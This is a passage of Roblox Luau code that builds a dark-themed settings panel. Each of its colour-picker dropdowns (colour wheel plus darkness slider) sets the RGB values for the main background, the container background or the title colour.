	local mousePos = uis:GetMouseLocation() - Vector2.new(0, game:GetService("GuiService"):GetGuiInset().Y)
	
	local centreOfWheel = Vector2.new(colourWheel.AbsolutePosition.X + (colourWheel.AbsoluteSize.X/2), colourWheel.AbsolutePosition.Y + (colourWheel.AbsoluteSize.Y/2))
	
	local distanceFromWheel = (mousePos - centreOfWheel).Magnitude
	
	
	if distanceFromWheel <= colourWheel.AbsoluteSize.X/2 and buttonDown then
		
		wheelPicker.Position = UDim2.new(0, mousePos.X - colourWheel.AbsolutePosition.X, 0, mousePos.Y - colourWheel.AbsolutePosition.Y)

		
	elseif movingSlider then
		
		darknessSlider.Position = UDim2.new(darknessSlider.Position.X.Scale, 0, 0, 
			math.clamp(
			mousePos.Y - darknessPicker.AbsolutePosition.Y, 
			0, 
			darknessPicker.AbsoluteSize.Y)
		)	
	end
	
	
	updateColour(centreOfWheel)
end)
end
end
start_2()

---------------------------

_3MainBackGround.Name = "3 MainBackGround"
_3MainBackGround.Parent = RightCostum
_3MainBackGround.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
_3MainBackGround.Size = UDim2.new(0, 221, 0, 22)

title_2.Name = "title"
title_2.Parent = _3MainBackGround
title_2.AnchorPoint = Vector2.new(0, 0.5)
title_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
title_2.BackgroundTransparency = 1.000
title_2.Position = UDim2.new(0.1402715, 0, 0.5, 0)
title_2.Size = UDim2.new(0.511312246, 0, 1, 0)
title_2.Font = Enum.Font.GothamMedium
title_2.Text = "Main BackGround"
title_2.TextColor3 = Color3.fromRGB(235, 235, 235)
title_2.TextSize = 13.000
title_2.TextXAlignment = Enum.TextXAlignment.Left

indicator_2.Name = "indicator"
indicator_2.Parent = _3MainBackGround
indicator_2.AnchorPoint = Vector2.new(1, 0.5)
indicator_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
indicator_2.Position = UDim2.new(1, 0, 0.522727251, 0)
indicator_2.Size = UDim2.new(-0.0328681208, 75, 0.681818187, 0)

corner_4.CornerRadius = UDim.new(0, 3)
corner_4.Name = "corner"
corner_4.Parent = indicator_2

rgb_2.Name = "rgb"
rgb_2.Parent = indicator_2
rgb_2.AnchorPoint = Vector2.new(0.5, 0.5)
rgb_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
rgb_2.BackgroundTransparency = 1.000
rgb_2.Position = UDim2.new(0.5, 0, 0.5, 0)
rgb_2.Size = UDim2.new(1, -14, 1, 0)
rgb_2.Font = Enum.Font.Gotham
rgb_2.Text = "255, 255, 255"
rgb_2.TextColor3 = Color3.fromRGB(12, 12, 12)
rgb_2.TextSize = 11.000

UICorner_2.CornerRadius = UDim.new(0, 3)
UICorner_2.Parent = _3MainBackGround

ImageLabel_2.Parent = _3MainBackGround
ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_2.BackgroundTransparency = 1.000
ImageLabel_2.Position = UDim2.new(0.0280000009, 0, 0.216000006, -4)
ImageLabel_2.Size = UDim2.new(0, 18, 0, 18)
ImageLabel_2.Image = "rbxassetid://3926307971"
ImageLabel_2.ImageColor3 = Color3.fromRGB(42, 78, 199)
ImageLabel_2.ImageRectOffset = Vector2.new(804, 4)
ImageLabel_2.ImageRectSize = Vector2.new(36, 36)

---------------------

function start_4()
    local _4MainBackGroundDrop = Instance.new("Frame")
    local corner_5 = Instance.new("UICorner")
    local container_2 = Instance.new("Frame")
    local corner_6 = Instance.new("UICorner")
    local ColourWheel_2 = Instance.new("ImageButton")
    local UIAspectRatioConstraint_2 = Instance.new("UIAspectRatioConstraint")
    local Picker_2 = Instance.new("ImageLabel")
    local DarknessPicker_2 = Instance.new("ImageButton")
    local UIGradient_2 = Instance.new("UIGradient")
    local Slider_2 = Instance.new("ImageLabel")
    local clickblock_2 = Instance.new("TextButton")
_4MainBackGroundDrop.Name = "4 MainBackGroundDrop"
_4MainBackGroundDrop.Parent = RightCostum
_4MainBackGroundDrop.AnchorPoint = Vector2.new(0.5, 0)
_4MainBackGroundDrop.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
_4MainBackGroundDrop.Position = UDim2.new(0.454732507, 0, 0.430672854, 2)
_4MainBackGroundDrop.Size = UDim2.new(0.909465015, 0, -0.0643519685, 148)
_4MainBackGroundDrop.Visible = false
_4MainBackGroundDrop.ZIndex = 3
_3MainBackGround.MouseButton1Click:connect(function()
    if _4MainBackGroundDrop.Visible == true then
        _4MainBackGroundDrop.Visible = false
    else
        for i,v in pairs(RightCostum:GetChildren()) do
            if string.find(v.Name, "Drop") then
                v.Visible = false
            end
        end
        _4MainBackGroundDrop.Visible = true
    end
end)

corner_5.CornerRadius = UDim.new(0, 3)
corner_5.Name = "corner"
corner_5.Parent = _4MainBackGroundDrop

container_2.Name = "container"
container_2.Parent = _4MainBackGroundDrop
container_2.AnchorPoint = Vector2.new(0.5, 0.5)
container_2.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
container_2.Position = UDim2.new(0.5, 0, 0.49999994, 0)
container_2.Size = UDim2.new(1.00163865, -4, 0.99999994, -4)
container_2.ZIndex = 3

corner_6.CornerRadius = UDim.new(0, 3)
corner_6.Name = "corner"
corner_6.Parent = container_2

ColourWheel_2.Name = "ColourWheel"
ColourWheel_2.Parent = container_2
ColourWheel_2.Active = false
ColourWheel_2.AnchorPoint = Vector2.new(0.5, 0.5)
ColourWheel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ColourWheel_2.BackgroundTransparency = 1.000
ColourWheel_2.BorderSizePixel = 0
ColourWheel_2.Position = UDim2.new(0.309100389, 0, 0.512530446, 0)
ColourWheel_2.Selectable = false
ColourWheel_2.Size = UDim2.new(0.434449941, 0, 0.86922574, 0)
ColourWheel_2.Image = "http://www.roblox.com/asset/?id=6020299385"

UIAspectRatioConstraint_2.Parent = ColourWheel_2
UIAspectRatioConstraint_2.AspectRatio = 1.000

Picker_2.Name = "Picker"
Picker_2.Parent = ColourWheel_2
Picker_2.AnchorPoint = Vector2.new(0.5, 0.5)
Picker_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Picker_2.BackgroundTransparency = 1.000
Picker_2.BorderSizePixel = 0
Picker_2.Position = UDim2.new(0.5, 0, 0.5, 0)
Picker_2.Size = UDim2.new(0.0900257826, 0, 0.0900257975, 0)
Picker_2.Image = "http://www.roblox.com/asset/?id=3678860011"

DarknessPicker_2.Name = "DarknessPicker"
DarknessPicker_2.Parent = container_2
DarknessPicker_2.Active = false
DarknessPicker_2.AnchorPoint = Vector2.new(0.5, 0.5)
DarknessPicker_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DarknessPicker_2.BackgroundTransparency = 1.000
DarknessPicker_2.BorderSizePixel = 0
DarknessPicker_2.Position = UDim2.new(0.657959282, 0, 0.503847122, 0)
DarknessPicker_2.Selectable = false
DarknessPicker_2.Size = UDim2.new(0.062522307, 0, 0.887292862, 0)
DarknessPicker_2.ZIndex = 2
DarknessPicker_2.Image = "rbxassetid://3570695787"
DarknessPicker_2.ScaleType = Enum.ScaleType.Slice
DarknessPicker_2.SliceCenter = Rect.new(100, 100, 100, 100)
DarknessPicker_2.SliceScale = 0.120

UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 0, 0))}
UIGradient_2.Rotation = 90
UIGradient_2.Parent = DarknessPicker_2

Slider_2.Name = "Slider"
Slider_2.Parent = DarknessPicker_2
Slider_2.AnchorPoint = Vector2.new(0.5, 0.5)
Slider_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Slider_2.BackgroundTransparency = 1.000
Slider_2.BorderSizePixel = 0
Slider_2.Position = UDim2.new(0.491197795, 0, 0.0733607039, 0)
Slider_2.Size = UDim2.new(1.28656352, 0, 0.0265010502, 0)
Slider_2.ZIndex = 2
Slider_2.Image = "rbxassetid://3570695787"
Slider_2.ImageColor3 = Color3.fromRGB(255, 74, 74)
Slider_2.ScaleType = Enum.ScaleType.Slice
Slider_2.SliceCenter = Rect.new(100, 100, 100, 100)
Slider_2.SliceScale = 0.120

clickblock_2.Name = "clickblock"
clickblock_2.Parent = _4MainBackGroundDrop
clickblock_2.AnchorPoint = Vector2.new(0.5, 0.5)
clickblock_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
clickblock_2.BackgroundTransparency = 1.000
clickblock_2.Position = UDim2.new(0.5, 0, 0.49999994, 0)
clickblock_2.Size = UDim2.new(1, 0, 1, 0)
clickblock_2.ZIndex = 2
clickblock_2.Font = Enum.Font.SourceSans
clickblock_2.Text = ""
clickblock_2.TextColor3 = Color3.fromRGB(0, 0, 0)
clickblock_2.TextSize = 14.000
if doesineediscool == true then
local colourWheel = ColourWheel_2
local wheelPicker = Picker_2

local rgb = rgb_2
local uiGradient = uiGradient_2
local darknessPicker = DarknessPicker_2
local darknessSlider = Slider_2

local colourDisplay = indicator_2


local uis = game:GetService("UserInputService")


local buttonDown = false
local movingSlider = false


local function updateColour(centreOfWheel)
	
	
	local colourPickerCentre = Vector2.new(
		wheelPicker.AbsolutePosition.X + (wheelPicker.AbsoluteSize.X/2),
		wheelPicker.AbsolutePosition.Y + (wheelPicker.AbsoluteSize.Y/2)
	)
	local h = (math.pi - math.atan2(colourPickerCentre.Y - centreOfWheel.Y, colourPickerCentre.X - centreOfWheel.X)) / (math.pi * 2)
	
	local s = (centreOfWheel - colourPickerCentre).Magnitude / (colourWheel.AbsoluteSize.X/2)
	
	local v = math.abs((darknessSlider.AbsolutePosition.Y - darknessPicker.AbsolutePosition.Y) / darknessPicker.AbsoluteSize.Y - 1)
	
	
	local hsv = Color3.fromHSV(math.clamp(h, 0, 1), math.clamp(s, 0, 1), math.clamp(v, 0, 1))
	

	colourDisplay.BackgroundColor3 = hsv
	local colors = hsv -- or any random HSV color
-- multiply the components by 255 and get the nearest number
local r,g,b = math.floor((colors.R*255)+0.5),math.floor((colors.G*255)+0.5),math.floor((colors.B*255)+0.5)
	rgb.Text = r..", "..g..", "..b
    COLORTABLE.MainBackGround[1] = r
    COLORTABLE.MainBackGround[2] = g
    COLORTABLE.MainBackGround[3] = b

end


colourWheel.MouseButton1Down:Connect(function()
	buttonDown = true
end)

darknessPicker.MouseButton1Down:Connect(function()
	movingSlider = true
end)


uis.InputEnded:Connect(function(input)
	
	if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
	
	buttonDown = false
	movingSlider = false
end)


uis.InputChanged:Connect(function(input)
	
	if input.UserInputType ~= Enum.UserInputType.MouseMovement then return end
	
	
	local mousePos = uis:GetMouseLocation() - Vector2.new(0, game:GetService("GuiService"):GetGuiInset().Y)
	
	local centreOfWheel = Vector2.new(colourWheel.AbsolutePosition.X + (colourWheel.AbsoluteSize.X/2), colourWheel.AbsolutePosition.Y + (colourWheel.AbsoluteSize.Y/2))
	
	local distanceFromWheel = (mousePos - centreOfWheel).Magnitude
	
	
	if distanceFromWheel <= colourWheel.AbsoluteSize.X/2 and buttonDown then
		
		wheelPicker.Position = UDim2.new(0, mousePos.X - colourWheel.AbsolutePosition.X, 0, mousePos.Y - colourWheel.AbsolutePosition.Y)

		
	elseif movingSlider then
		
		darknessSlider.Position = UDim2.new(darknessSlider.Position.X.Scale, 0, 0, 
			math.clamp(
			mousePos.Y - darknessPicker.AbsolutePosition.Y, 
			0, 
			darknessPicker.AbsoluteSize.Y)
		)	
	end
	
	
	updateColour(centreOfWheel)
end)
end
end
start_4()

---------------------------

_5ContainerBackGround.Name = "5 ContainerBackGround"
_5ContainerBackGround.Parent = RightCostum
_5ContainerBackGround.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
_5ContainerBackGround.Size = UDim2.new(0, 221, 0, 22)

title_3.Name = "title"
title_3.Parent = _5ContainerBackGround
title_3.AnchorPoint = Vector2.new(0, 0.5)
title_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
title_3.BackgroundTransparency = 1.000
title_3.Position = UDim2.new(0.1402715, 0, 0.5, 0)
title_3.Size = UDim2.new(0.511312246, 0, 1, 0)
title_3.Font = Enum.Font.GothamMedium
title_3.Text = "Container BackGround"
title_3.TextColor3 = Color3.fromRGB(235, 235, 235)
title_3.TextSize = 11.000
title_3.TextXAlignment = Enum.TextXAlignment.Left

indicator_3.Name = "indicator"
indicator_3.Parent = _5ContainerBackGround
indicator_3.AnchorPoint = Vector2.new(1, 0.5)
indicator_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
indicator_3.Position = UDim2.new(1, 0, 0.522727251, 0)
indicator_3.Size = UDim2.new(-0.0328681208, 75, 0.681818187, 0)

corner_7.CornerRadius = UDim.new(0, 3)
corner_7.Name = "corner"
corner_7.Parent = indicator_3

rgb_3.Name = "rgb"
rgb_3.Parent = indicator_3
rgb_3.AnchorPoint = Vector2.new(0.5, 0.5)
rgb_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
rgb_3.BackgroundTransparency = 1.000
rgb_3.Position = UDim2.new(0.5, 0, 0.5, 0)
rgb_3.Size = UDim2.new(1, -14, 1, 0)
rgb_3.Font = Enum.Font.Gotham
rgb_3.Text = "255, 255, 255"
rgb_3.TextColor3 = Color3.fromRGB(12, 12, 12)
rgb_3.TextSize = 11.000

UICorner_3.CornerRadius = UDim.new(0, 3)
UICorner_3.Parent = _5ContainerBackGround

ImageLabel_3.Parent = _5ContainerBackGround
ImageLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_3.BackgroundTransparency = 1.000
ImageLabel_3.Position = UDim2.new(0.0280000009, 0, 0.216000006, -4)
ImageLabel_3.Size = UDim2.new(0, 18, 0, 18)
ImageLabel_3.Image = "rbxassetid://3926307971"
ImageLabel_3.ImageColor3 = Color3.fromRGB(42, 78, 199)
ImageLabel_3.ImageRectOffset = Vector2.new(804, 4)
ImageLabel_3.ImageRectSize = Vector2.new(36, 36)

--------------------------
function start_6()
    local _6ContainerBackGroundDrop = Instance.new("Frame")
local corner_8 = Instance.new("UICorner")
local container_3 = Instance.new("Frame")
local corner_9 = Instance.new("UICorner")
local ColourWheel_3 = Instance.new("ImageButton")
local UIAspectRatioConstraint_3 = Instance.new("UIAspectRatioConstraint")
local Picker_3 = Instance.new("ImageLabel")
local DarknessPicker_3 = Instance.new("ImageButton")
local UIGradient_3 = Instance.new("UIGradient")
local Slider_3 = Instance.new("ImageLabel")
local clickblock_3 = Instance.new("TextButton")
_6ContainerBackGroundDrop.Name = "6  ContainerBackGroundDrop"
_6ContainerBackGroundDrop.Parent = RightCostum
_6ContainerBackGroundDrop.AnchorPoint = Vector2.new(0.5, 0)
_6ContainerBackGroundDrop.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
_6ContainerBackGroundDrop.Position = UDim2.new(0.454732507, 0, 0.430672854, 2)
_6ContainerBackGroundDrop.Size = UDim2.new(0.909465015, 0, -0.0643519685, 148)
_6ContainerBackGroundDrop.Visible = false
_6ContainerBackGroundDrop.ZIndex = 3
_5ContainerBackGround.MouseButton1Click:connect(function()
    if _6ContainerBackGroundDrop.Visible == true then
        _6ContainerBackGroundDrop.Visible = false
    else
        for i,v in pairs(RightCostum:GetChildren()) do
            if string.find(v.Name, "Drop") then
                v.Visible = false
            end
        end
        _6ContainerBackGroundDrop.Visible = true
    end
end)
corner_8.CornerRadius = UDim.new(0, 3)
corner_8.Name = "corner"
corner_8.Parent = _6ContainerBackGroundDrop

container_3.Name = "container"
container_3.Parent = _6ContainerBackGroundDrop
container_3.AnchorPoint = Vector2.new(0.5, 0.5)
container_3.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
container_3.Position = UDim2.new(0.5, 0, 0.49999994, 0)
container_3.Size = UDim2.new(1.00163865, -4, 0.99999994, -4)
container_3.ZIndex = 3

corner_9.CornerRadius = UDim.new(0, 3)
corner_9.Name = "corner"
corner_9.Parent = container_3

ColourWheel_3.Name = "ColourWheel"
ColourWheel_3.Parent = container_3
ColourWheel_3.Active = false
ColourWheel_3.AnchorPoint = Vector2.new(0.5, 0.5)
ColourWheel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ColourWheel_3.BackgroundTransparency = 1.000
ColourWheel_3.BorderSizePixel = 0
ColourWheel_3.Position = UDim2.new(0.309100389, 0, 0.512530446, 0)
ColourWheel_3.Selectable = false
ColourWheel_3.Size = UDim2.new(0.434449941, 0, 0.86922574, 0)
ColourWheel_3.Image = "http://www.roblox.com/asset/?id=6020299385"

UIAspectRatioConstraint_3.Parent = ColourWheel_3
UIAspectRatioConstraint_3.AspectRatio = 1.000

Picker_3.Name = "Picker"
Picker_3.Parent = ColourWheel_3
Picker_3.AnchorPoint = Vector2.new(0.5, 0.5)
Picker_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Picker_3.BackgroundTransparency = 1.000
Picker_3.BorderSizePixel = 0
Picker_3.Position = UDim2.new(0.5, 0, 0.5, 0)
Picker_3.Size = UDim2.new(0.0900257826, 0, 0.0900257975, 0)
Picker_3.Image = "http://www.roblox.com/asset/?id=3678860011"

DarknessPicker_3.Name = "DarknessPicker"
DarknessPicker_3.Parent = container_3
DarknessPicker_3.Active = false
DarknessPicker_3.AnchorPoint = Vector2.new(0.5, 0.5)
DarknessPicker_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DarknessPicker_3.BackgroundTransparency = 1.000
DarknessPicker_3.BorderSizePixel = 0
DarknessPicker_3.Position = UDim2.new(0.657959282, 0, 0.503847122, 0)
DarknessPicker_3.Selectable = false
DarknessPicker_3.Size = UDim2.new(0.062522307, 0, 0.887292862, 0)
DarknessPicker_3.ZIndex = 2
DarknessPicker_3.Image = "rbxassetid://3570695787"
DarknessPicker_3.ScaleType = Enum.ScaleType.Slice
DarknessPicker_3.SliceCenter = Rect.new(100, 100, 100, 100)
DarknessPicker_3.SliceScale = 0.120

UIGradient_3.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 0, 0))}
UIGradient_3.Rotation = 90
UIGradient_3.Parent = DarknessPicker_3

Slider_3.Name = "Slider"
Slider_3.Parent = DarknessPicker_3
Slider_3.AnchorPoint = Vector2.new(0.5, 0.5)
Slider_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Slider_3.BackgroundTransparency = 1.000
Slider_3.BorderSizePixel = 0
Slider_3.Position = UDim2.new(0.491197795, 0, 0.0733607039, 0)
Slider_3.Size = UDim2.new(1.28656352, 0, 0.0265010502, 0)
Slider_3.ZIndex = 2
Slider_3.Image = "rbxassetid://3570695787"
Slider_3.ImageColor3 = Color3.fromRGB(255, 74, 74)
Slider_3.ScaleType = Enum.ScaleType.Slice
Slider_3.SliceCenter = Rect.new(100, 100, 100, 100)
Slider_3.SliceScale = 0.120

clickblock_3.Name = "clickblock"
clickblock_3.Parent = _6ContainerBackGroundDrop
clickblock_3.AnchorPoint = Vector2.new(0.5, 0.5)
clickblock_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
clickblock_3.BackgroundTransparency = 1.000
clickblock_3.Position = UDim2.new(0.5, 0, 0.49999994, 0)
clickblock_3.Size = UDim2.new(1, 0, 1, 0)
clickblock_3.ZIndex = 2
clickblock_3.Font = Enum.Font.SourceSans
clickblock_3.Text = ""
clickblock_3.TextColor3 = Color3.fromRGB(0, 0, 0)
clickblock_3.TextSize = 14.000

if doesineediscool == true then
local colourWheel = ColourWheel_3
local wheelPicker = Picker_3

local rgb = rgb_3

local darknessPicker = DarknessPicker_3
local darknessSlider = Slider_3
local uiGradient = uiGradient_3
local colourDisplay = indicator_3


local uis = game:GetService("UserInputService")


local buttonDown = false
local movingSlider = false


local function updateColour(centreOfWheel)
	
	
	local colourPickerCentre = Vector2.new(
		wheelPicker.AbsolutePosition.X + (wheelPicker.AbsoluteSize.X/2),
		wheelPicker.AbsolutePosition.Y + (wheelPicker.AbsoluteSize.Y/2)
	)
	local h = (math.pi - math.atan2(colourPickerCentre.Y - centreOfWheel.Y, colourPickerCentre.X - centreOfWheel.X)) / (math.pi * 2)
	
	local s = (centreOfWheel - colourPickerCentre).Magnitude / (colourWheel.AbsoluteSize.X/2)
	
	local v = math.abs((darknessSlider.AbsolutePosition.Y - darknessPicker.AbsolutePosition.Y) / darknessPicker.AbsoluteSize.Y - 1)
	
	
	local hsv = Color3.fromHSV(math.clamp(h, 0, 1), math.clamp(s, 0, 1), math.clamp(v, 0, 1))
	

	colourDisplay.BackgroundColor3 = hsv
	local colors = hsv -- or any random HSV color
-- multiply the components by 255 and get the nearest number
local r,g,b = math.floor((colors.R*255)+0.5),math.floor((colors.G*255)+0.5),math.floor((colors.B*255)+0.5)
	rgb.Text = r..", "..g..", "..b
    COLORTABLE.ContainerBackGround[1] = r
    COLORTABLE.ContainerBackGround[2] = g
    COLORTABLE.ContainerBackGround[3] = b
end


colourWheel.MouseButton1Down:Connect(function()
	buttonDown = true
end)

darknessPicker.MouseButton1Down:Connect(function()
	movingSlider = true
end)


uis.InputEnded:Connect(function(input)
	
	if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
	
	buttonDown = false
	movingSlider = false
end)


uis.InputChanged:Connect(function(input)
	
	if input.UserInputType ~= Enum.UserInputType.MouseMovement then return end
	
	
	local mousePos = uis:GetMouseLocation() - Vector2.new(0, game:GetService("GuiService"):GetGuiInset().Y)
	
	local centreOfWheel = Vector2.new(colourWheel.AbsolutePosition.X + (colourWheel.AbsoluteSize.X/2), colourWheel.AbsolutePosition.Y + (colourWheel.AbsoluteSize.Y/2))
	
	local distanceFromWheel = (mousePos - centreOfWheel).Magnitude
	
	
	if distanceFromWheel <= colourWheel.AbsoluteSize.X/2 and buttonDown then
		
		wheelPicker.Position = UDim2.new(0, mousePos.X - colourWheel.AbsolutePosition.X, 0, mousePos.Y - colourWheel.AbsolutePosition.Y)

		
	elseif movingSlider then
		
		darknessSlider.Position = UDim2.new(darknessSlider.Position.X.Scale, 0, 0, 
			math.clamp(
			mousePos.Y - darknessPicker.AbsolutePosition.Y, 
			0, 
			darknessPicker.AbsoluteSize.Y)
		)	
	end
	
	
	updateColour(centreOfWheel)
end)
end
end
start_6()

----------------

_7TitleColour.Name = "7 TitleColour"
_7TitleColour.Parent = RightCostum
_7TitleColour.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
_7TitleColour.Size = UDim2.new(0, 221, 0, 22)

title_4.Name = "title"
title_4.Parent = _7TitleColour
title_4.AnchorPoint = Vector2.new(0, 0.5)
title_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
title_4.BackgroundTransparency = 1.000
title_4.Position = UDim2.new(0.1402715, 0, 0.5, 0)
title_4.Size = UDim2.new(0.511312246, 0, 1, 0)
title_4.Font = Enum.Font.GothamMedium
title_4.Text = "Title Colour"
title_4.TextColor3 = Color3.fromRGB(235, 235, 235)
title_4.TextSize = 13.000
title_4.TextXAlignment = Enum.TextXAlignment.Left

indicator_4.Name = "indicator"
indicator_4.Parent = _7TitleColour
indicator_4.AnchorPoint = Vector2.new(1, 0.5)
indicator_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
indicator_4.Position = UDim2.new(1, 0, 0.522727251, 0)
indicator_4.Size = UDim2.new(-0.0328681208, 75, 0.681818187, 0)

corner_10.CornerRadius = UDim.new(0, 3)
corner_10.Name = "corner"
corner_10.Parent = indicator_4

rgb_4.Name = "rgb"
rgb_4.Parent = indicator_4
rgb_4.AnchorPoint = Vector2.new(0.5, 0.5)
rgb_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
rgb_4.BackgroundTransparency = 1.000
rgb_4.Position = UDim2.new(0.5, 0, 0.5, 0)
rgb_4.Size = UDim2.new(1, -14, 1, 0)
rgb_4.Font = Enum.Font.Gotham
rgb_4.Text = "255, 255, 255"
rgb_4.TextColor3 = Color3.fromRGB(12, 12, 12)
rgb_4.TextSize = 11.000

UICorner_4.CornerRadius = UDim.new(0, 3)
UICorner_4.Parent = _7TitleColour

ImageLabel_4.Parent = _7TitleColour
ImageLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_4.BackgroundTransparency = 1.000
ImageLabel_4.Position = UDim2.new(0.0280000009, 0, 0.216000006, -4)
ImageLabel_4.Size = UDim2.new(0, 18, 0, 18)
ImageLabel_4.Image = "rbxassetid://3926307971"
ImageLabel_4.ImageColor3 = Color3.fromRGB(42, 78, 199)
ImageLabel_4.ImageRectOffset = Vector2.new(804, 4)
ImageLabel_4.ImageRectSize = Vector2.new(36, 36)

----------
function start_8()
    local _8TitleColourDrop = Instance.new("Frame")
local corner_11 = Instance.new("UICorner")
local container_4 = Instance.new("Frame")
local corner_12 = Instance.new("UICorner")
local ColourWheel_4 = Instance.new("ImageButton")
local UIAspectRatioConstraint_4 = Instance.new("UIAspectRatioConstraint")
local Picker_4 = Instance.new("ImageLabel")
local DarknessPicker_4 = Instance.new("ImageButton")
local UIGradient_4 = Instance.new("UIGradient")
local Slider_4 = Instance.new("ImageLabel")
local clickblock_4 = Instance.new("TextButton")
_8TitleColourDrop.Name = "8 TitleColourDrop"
_8TitleColourDrop.Parent = RightCostum
_8TitleColourDrop.AnchorPoint = Vector2.new(0.5, 0)
_8TitleColourDrop.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
_8TitleColourDrop.Position = UDim2.new(0.454732388, 0, 0.0572139286, 2)
_8TitleColourDrop.Size = UDim2.new(0.909464896, 0, -0.0643519685, 148)
_8TitleColourDrop.Visible = false
_8TitleColourDrop.ZIndex = 3
_7TitleColour.MouseButton1Click:connect(function()
    if _8TitleColourDrop.Visible == true then
        _8TitleColourDrop.Visible = false
    else
        for i,v in pairs(RightCostum:GetChildren()) do
            if string.find(v.Name, "Drop") then
                v.Visible = false
            end
        end
        _8TitleColourDrop.Visible = true
    end
end)
corner_11.CornerRadius = UDim.new(0, 3)
corner_11.Name = "corner"
corner_11.Parent = _8TitleColourDrop

container_4.Name = "container"
container_4.Parent = _8TitleColourDrop
container_4.AnchorPoint = Vector2.new(0.5, 0.5)
container_4.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
container_4.Position = UDim2.new(0.500000179, 0, 0.49999994, 0)
container_4.Size = UDim2.new(1.00163865, -4, 0.99999994, -4)
container_4.ZIndex = 3

corner_12.CornerRadius = UDim.new(0, 3)
corner_12.Name = "corner"
corner_12.Parent = container_4

ColourWheel_4.Name = "ColourWheel"
ColourWheel_4.Parent = container_4
ColourWheel_4.Active = false
ColourWheel_4.AnchorPoint = Vector2.new(0.5, 0.5)
ColourWheel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ColourWheel_4.BackgroundTransparency = 1.000
ColourWheel_4.BorderSizePixel = 0
ColourWheel_4.Position = UDim2.new(0.309100389, 0, 0.512530446, 0)
ColourWheel_4.Selectable = false
ColourWheel_4.Size = UDim2.new(0.434449941, 0, 0.86922574, 0)
ColourWheel_4.Image = "http://www.roblox.com/asset/?id=6020299385"

UIAspectRatioConstraint_4.Parent = ColourWheel_4
UIAspectRatioConstraint_4.AspectRatio = 1.000

Picker_4.Name = "Picker"
Picker_4.Parent = ColourWheel_4
Picker_4.AnchorPoint = Vector2.new(0.5, 0.5)
Picker_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Picker_4.BackgroundTransparency = 1.000
Picker_4.BorderSizePixel = 0
Picker_4.Position = UDim2.new(0.5, 0, 0.5, 0)
Picker_4.Size = UDim2.new(0.0900257826, 0, 0.0900257975, 0)
Picker_4.Image = "http://www.roblox.com/asset/?id=3678860011"

DarknessPicker_4.Name = "DarknessPicker"
DarknessPicker_4.Parent = container_4
DarknessPicker_4.Active = false
DarknessPicker_4.AnchorPoint = Vector2.new(0.5, 0.5)
DarknessPicker_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DarknessPicker_4.BackgroundTransparency = 1.000
DarknessPicker_4.BorderSizePixel = 0
DarknessPicker_4.Position = UDim2.new(0.657959282, 0, 0.503847122, 0)
DarknessPicker_4.Selectable = false
DarknessPicker_4.Size = UDim2.new(0.062522307, 0, 0.887292862, 0)
DarknessPicker_4.ZIndex = 2
DarknessPicker_4.Image = "rbxassetid://3570695787"
DarknessPicker_4.ScaleType = Enum.ScaleType.Slice
DarknessPicker_4.SliceCenter = Rect.new(100, 100, 100, 100)
DarknessPicker_4.SliceScale = 0.120

UIGradient_4.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 0, 0))}
UIGradient_4.Rotation = 90
UIGradient_4.Parent = DarknessPicker_4

Slider_4.Name = "Slider"
Slider_4.Parent = DarknessPicker_4
Slider_4.AnchorPoint = Vector2.new(0.5, 0.5)
Slider_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Slider_4.BackgroundTransparency = 1.000
Slider_4.BorderSizePixel = 0
Slider_4.Position = UDim2.new(0.491197795, 0, 0.0733607039, 0)
Slider_4.Size = UDim2.new(1.28656352, 0, 0.0265010502, 0)
Slider_4.ZIndex = 2
Slider_4.Image = "rbxassetid://3570695787"
Slider_4.ImageColor3 = Color3.fromRGB(255, 74, 74)
Slider_4.ScaleType = Enum.ScaleType.Slice
Slider_4.SliceCenter = Rect.new(100, 100, 100, 100)
Slider_4.SliceScale = 0.120

clickblock_4.Name = "clickblock"
clickblock_4.Parent = _8TitleColourDrop
clickblock_4.AnchorPoint = Vector2.new(0.5, 0.5)
clickblock_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
clickblock_4.BackgroundTransparency = 1.000
